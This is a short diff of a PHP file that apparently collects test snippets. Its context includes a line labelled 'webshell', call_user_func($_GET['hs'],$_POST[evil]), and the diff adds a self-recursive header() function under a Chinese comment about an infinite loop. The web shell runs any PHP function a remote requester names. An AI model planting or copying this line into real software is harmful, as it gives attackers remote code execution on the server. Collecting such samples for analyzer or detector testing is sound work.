@@ -37,3 +37,10 @@ function e($a){
 
 # webshell
 call_user_func($_GET['hs'],$_POST[evil]);
+
+
+# 多语句导致的死循环？
+
+function header($d){
+    header($d);
+}
